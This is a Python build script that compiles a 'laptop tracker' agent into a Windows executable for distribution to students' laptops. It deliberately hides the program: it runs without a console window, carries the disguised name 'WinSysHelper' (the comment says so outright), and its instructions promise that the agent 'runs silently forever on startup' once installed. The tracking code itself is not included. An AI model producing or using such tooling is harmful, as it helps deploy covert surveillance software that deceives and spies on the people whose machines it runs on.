"""
=============================================================
  BUILD SCRIPT — Compile agent.py into a Windows .exe
  This creates a single .exe file with no console window
  that can be distributed to all UR students' laptops.

  Requirements:
    pip install pyinstaller

  Usage:
    python build.py
=============================================================
"""

import subprocess
import sys
import os

def build():
    print("Building UR Laptop Tracker Agent as Windows .exe...")
    print("=" * 55)

    cmd = [
        "pyinstaller",
        "--onefile",              # Single .exe file
        "--noconsole",            # No console window (runs silently)
        "--name", "WinSysHelper", # Disguised name
        "--icon", "NONE",         # Add icon path here if you have one
        "agent.py"
    ]

    result = subprocess.run(cmd, capture_output=False)

    if result.returncode == 0:
        exe_path = os.path.join("dist", "WinSysHelper.exe")
        print("\n✅ Build successful!")
        print(f"   EXE location: {exe_path}")
        print("\nDistribution:")
        print("  1. Copy WinSysHelper.exe + install.py to each student laptop")
        print("  2. Run: python install.py")
        print("  3. Agent runs silently forever on startup!")
    else:
        print("\n❌ Build failed. Make sure pyinstaller is installed:")
        print("   pip install pyinstaller")

if __name__ == "__main__":
    build()
